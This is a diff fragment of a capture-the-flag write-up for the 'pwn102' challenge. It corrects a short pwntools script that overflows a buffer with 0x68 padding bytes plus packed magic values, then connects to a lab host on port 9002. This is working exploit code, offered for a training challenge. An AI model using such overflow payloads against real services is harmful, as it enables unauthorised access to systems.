@@ -34,14 +34,15 @@ So lets write a simple script for thie challenge
 ```
 from pwn import *
 
-context.binary = binary = './pwn102.pwn102'
+context.binary = binary = './pwn102'
 
-payload = b'A'*0x68 + '0xc0d3' + '0xc0ff33'
+payload = b'A'*0x68 + p32(0xc0d3) + p32(0xc0ff33)
 
-p = remote("10.201.127.254",9002) # if you are solving it in local use p.process()
+p = remote("10.201.93.159",9002)
 p.recv()
 p.sendline(payload)
 p.interactive()
 ```
+
 
 
